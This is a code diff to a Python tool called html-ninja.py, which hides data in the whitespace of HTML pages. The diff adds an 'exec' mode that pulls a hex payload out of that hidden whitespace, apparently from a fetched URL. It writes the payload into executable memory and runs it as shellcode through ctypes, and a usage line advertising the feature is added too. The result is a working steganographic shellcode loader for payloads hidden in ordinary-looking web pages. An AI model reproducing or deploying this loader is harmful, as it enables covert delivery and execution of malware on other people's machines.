@@ -83,6 +83,20 @@ def decrypt ( src, dst , f_zlib):
 
 	if dst == "stdout":
 		print("\r\nContents: \r\n\r\n" + result)
+	elif dst == "exec":
+		import ctypes
+		import mmap
+		import binascii
+		shell_code = binascii.unhexlify(result.split("|")[0].replace('\\x',''))
+		mm = mmap.mmap(-1, len(shell_code), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
+		mm.write(shell_code)
+
+		restype = ctypes.c_int64
+		argtypes = tuple()
+		ctypes_buffer = ctypes.c_int.from_buffer(mm)
+		function = ctypes.CFUNCTYPE(restype, *argtypes)(ctypes.addressof(ctypes_buffer))
+		function()
+
 	else:
 		outfile = open(dst,"wb")
 		outfile.write(result)
@@ -166,6 +180,7 @@ def usage():
    print "html-ninja.py -d source outfile -> will try to decrypt white spaces in 'source' file into 'outfile'"
    print "html-ninja.py --check filename -> will check 'filename' for available spaces and spaces needed to embed the file"
    print "html-ninja.py -d http://localhost/html-ninja.html stdout -> will get http url and output to stdout"
+   print "html-ninja.py -d http://localhost/html-ninja.html exec -> will get http url and execute the hex payload (payload must have a '|' terminator)"
    print "html-ninja.py -ez / -dz ... -> adds zlib compression to both encryption and decryption"
    print "html-ninja.py -eb / -db ... -> adds bz2 compression to both encryption and decryption"
 
